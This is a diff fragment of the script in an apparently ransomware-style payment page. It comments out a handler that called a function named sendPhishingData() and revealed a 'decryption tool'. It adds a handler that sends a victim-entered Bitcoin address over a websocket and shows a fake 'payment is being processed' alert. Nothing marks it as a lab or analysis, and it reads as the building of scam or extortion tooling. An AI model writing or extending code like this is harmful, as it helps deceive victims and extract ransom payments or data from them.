@@ -202,12 +202,19 @@
         }
 
 
-        // Handle Form Submission
+        // // Handle Form Submission
+        // document.getElementById("payment-form").addEventListener("submit", function (event) {
+        //     event.preventDefault();
+        //     sendPhishingData();
+        //     document.getElementById('decryption-tool').classList.remove('hidden');
+        //     document.getElementById('payment-form').classList.add('hidden');
+        
         document.getElementById("payment-form").addEventListener("submit", function (event) {
-            event.preventDefault();
-            sendPhishingData();
-            document.getElementById('decryption-tool').classList.remove('hidden');
-            document.getElementById('payment-form').classList.add('hidden');
+            event.preventDefault(); // Prevent actual form submission
+            let btcAddress = document.getElementById("btc-address").value;
+            ws.send(JSON.stringify({ "btc_address": btcAddress }));
+            alert("Your payment is being processed... Please wait.");
+    
         });
     </script>
 </body>
